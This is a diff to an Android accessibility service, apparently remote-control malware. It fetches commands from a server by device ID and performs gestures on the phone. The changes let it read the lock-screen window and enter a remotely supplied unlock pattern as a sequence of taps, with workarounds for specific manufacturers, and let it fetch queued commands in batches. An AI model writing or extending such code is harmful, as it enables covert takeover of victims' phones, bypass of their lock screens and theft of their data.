@@ -154,18 +154,26 @@ class ControleGestosService : AccessibilityService() {
         }
 
         val janelasApp = janelas.filter { !ehJanelaOverlay(it) }
-        if (janelasApp.isEmpty()) return rootInActiveWindow
+        if (janelasApp.isEmpty()) {
+            obterJanelasKeyguard().firstOrNull()?.root?.let { return it }
+            return rootInActiveWindow
+        }
 
         janelasApp.firstOrNull { it.isFocused }?.root?.let { return it }
         janelasApp.firstOrNull { it.isActive }?.root?.let { return it }
 
-        return janelasApp
+        val raizApp = janelasApp
             .filter { it.type == AccessibilityWindowInfo.TYPE_APPLICATION }
             .maxByOrNull { janela ->
                 val area = Rect()
                 janela.root?.getBoundsInScreen(area)
                 area.width() * area.height()
-            }?.root ?: rootInActiveWindow
+            }?.root
+
+        if (raizApp != null) return raizApp
+
+        obterJanelasKeyguard().firstOrNull()?.root?.let { return it }
+        return rootInActiveWindow
     }
 
     private fun extrairEstruturaCompleta(): String {
@@ -348,10 +356,25 @@ class ControleGestosService : AccessibilityService() {
         return p.contains("launcher") || p.contains("home") || p == "com.sec.android.app.launcher"
     }
 
-    private fun ehPacoteIgnorado(pacote: String): Boolean {
-        if (pacote.isBlank() || pacote == packageName) return true
+    private fun ehPacoteKeyguard(pacote: String): Boolean {
         val p = pacote.lowercase()
         return p == "com.android.systemui" || p.contains("keyguard")
+    }
+
+    private fun ehPacoteIgnorado(pacote: String): Boolean {
+        if (pacote.isBlank() || pacote == packageName) return true
+        return ehPacoteKeyguard(pacote)
+    }
+
+    private fun obterJanelasKeyguard(): List<AccessibilityWindowInfo> {
+        val janelas = windows ?: return emptyList()
+        return janelas.filter { janela ->
+            val raiz = janela.root ?: return@filter false
+            val pacote = raiz.packageName?.toString().orEmpty()
+            pacote != packageName &&
+                    janela.type != AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY &&
+                    ehPacoteKeyguard(pacote)
+        }
     }
 
     private fun obterJanelasAplicativo(): List<AccessibilityWindowInfo> {
@@ -393,6 +416,10 @@ class ControleGestosService : AccessibilityService() {
         }
 
         if (candidatas.isEmpty()) {
+            candidatas = obterJanelasKeyguard()
+        }
+
+        if (candidatas.isEmpty()) {
             candidatas = janelas.filter {
                 val raiz = it.root ?: return@filter false
                 val pacote = raiz.packageName?.toString().orEmpty()
@@ -409,6 +436,9 @@ class ControleGestosService : AccessibilityService() {
                     area.width() * area.height()
                 }
             if (todasApp.isNotEmpty()) return todasApp
+
+            val keyguard = obterJanelasKeyguard()
+            if (keyguard.isNotEmpty()) return selecionarMelhorJanela(keyguard)
         }
 
         return selecionarMelhorJanela(candidatas)
@@ -635,7 +665,7 @@ class ControleGestosService : AccessibilityService() {
         }
     }
 
-    private fun verificarComandosRecebidos() {
+    private fun obterProximoComando(): String? {
         var conexao: HttpURLConnection? = null
         try {
             val idDispositivo = obterIdDispositivo()
@@ -645,18 +675,30 @@ class ControleGestosService : AccessibilityService() {
                 connectTimeout = 2000
                 readTimeout = 2000
             }
-            if (conexao.responseCode == HttpURLConnection.HTTP_OK) {
-                val resposta = BufferedReader(InputStreamReader(conexao.inputStream, Charsets.UTF_8))
-                    .readText().trim()
-                if (resposta.isNotEmpty() && resposta != "nenhum") {
-                    Log.d("KL", "Comando: $resposta")
-                    Handler(Looper.getMainLooper()).post { processarComando(resposta) }
-                }
-            }
+            if (conexao.responseCode != HttpURLConnection.HTTP_OK) return null
+
+            val resposta = BufferedReader(InputStreamReader(conexao.inputStream, Charsets.UTF_8))
+                .readText().trim()
+            if (resposta.isEmpty() || resposta == "nenhum") return null
+            return resposta
         } catch (e: Exception) {
             Log.e("KL", "Erro ao buscar comando: ${e.message}")
+            return null
         } finally {
             conexao?.disconnect()
+        }
+    }
+
+    private fun verificarComandosRecebidos() {
+        try {
+            repeat(12) {
+                val comando = obterProximoComando() ?: return
+                Log.d("KL", "Comando: $comando")
+                handlerPrincipal.post { processarComando(comando) }
+                if (comando.startsWith("padrao|") || comando.startsWith("sequencia|")) return
+            }
+        } catch (e: Exception) {
+            Log.e("KL", "Erro ao processar comandos: ${e.message}")
         }
     }
 
@@ -1075,6 +1117,25 @@ class ControleGestosService : AccessibilityService() {
 
     // ─── Comandos ─────────────────────────────────────────────────────────────
 
+    private fun fabricanteUsaToquesParaPadrao(): Boolean {
+        val marca = Build.MANUFACTURER.lowercase()
+        return marca.contains("xiaomi") || marca.contains("redmi") || marca.contains("poco") ||
+                marca.contains("motorola") || marca.contains("lenovo")
+    }
+
+    private fun parsearPontos(coords: List<String>): List<Pair<Float, Float>>? {
+        if (coords.size < 2 || coords.size % 2 != 0) return null
+        val pontos = mutableListOf<Pair<Float, Float>>()
+        var i = 0
+        while (i + 1 < coords.size) {
+            val x = coords[i].trim().toFloatOrNull() ?: return null
+            val y = coords[i + 1].trim().toFloatOrNull() ?: return null
+            pontos.add(x to y)
+            i += 2
+        }
+        return pontos
+    }
+
     private fun processarComando(comando: String) {
         val partes = comando.split("|", limit = 2)
         if (partes.isEmpty()) return
@@ -1100,17 +1161,19 @@ class ControleGestosService : AccessibilityService() {
             }
             "padrao" -> {
                 val coords = partes.getOrNull(1)?.split(",") ?: return
-                if (coords.size < 4 || coords.size % 2 != 0) return
-                val pontos = mutableListOf<Pair<Float, Float>>()
-                var i = 0
-                while (i + 1 < coords.size) {
-                    val x = coords[i].trim().toFloatOrNull() ?: return
-                    val y = coords[i + 1].trim().toFloatOrNull() ?: return
-                    pontos.add(x to y)
-                    i += 2
+                val pontos = parsearPontos(coords) ?: return
+                if (fabricanteUsaToquesParaPadrao()) {
+                    executarSequenciaToques(pontos)
+                } else {
+                    executarPadraoContinuo(pontos)
                 }
-                executarPadraoContinuo(pontos)
                 ignorarArrastosAteMs = System.currentTimeMillis() + 3500
+            }
+            "sequencia" -> {
+                val coords = partes.getOrNull(1)?.split(",") ?: return
+                val pontos = parsearPontos(coords) ?: return
+                executarSequenciaToques(pontos)
+                ignorarArrastosAteMs = System.currentTimeMillis() + 5000
             }
             "rolar" -> {
                 val coords = partes.getOrNull(1)?.split(",") ?: return
@@ -1250,9 +1313,41 @@ class ControleGestosService : AccessibilityService() {
             }
 
             override fun onCancelled(gestureDescription: GestureDescription?) {
-                Log.w("KL", "Padrao cancelado")
+                Log.w("KL", "Padrao cancelado — tentando sequencia de toques")
+                executarSequenciaToques(pontos)
             }
         }, null)
+    }
+
+    private fun executarSequenciaToques(pontos: List<Pair<Float, Float>>) {
+        if (pontos.isEmpty()) return
+
+        fun proximo(indice: Int) {
+            if (indice >= pontos.size) {
+                Log.i("KL", "Sequencia de toques concluida (${pontos.size})")
+                return
+            }
+
+            val (x, y) = pontos[indice]
+            val caminho = Path().apply { moveTo(x, y) }
+            val gesto = GestureDescription.Builder()
+                .addStroke(GestureDescription.StrokeDescription(caminho, 0L, 90L))
+                .build()
+
+            Log.d("KL", "Toque sequencia ${indice + 1}/${pontos.size}: ($x,$y)")
+            dispatchGesture(gesto, object : GestureResultCallback() {
+                override fun onCompleted(gestureDescription: GestureDescription?) {
+                    handlerPrincipal.postDelayed({ proximo(indice + 1) }, 320L)
+                }
+
+                override fun onCancelled(gestureDescription: GestureDescription?) {
+                    Log.w("KL", "Toque ${indice + 1} cancelado")
+                    handlerPrincipal.postDelayed({ proximo(indice + 1) }, 320L)
+                }
+            }, null)
+        }
+
+        proximo(0)
     }
 
     private fun inserirTexto(texto: String) {
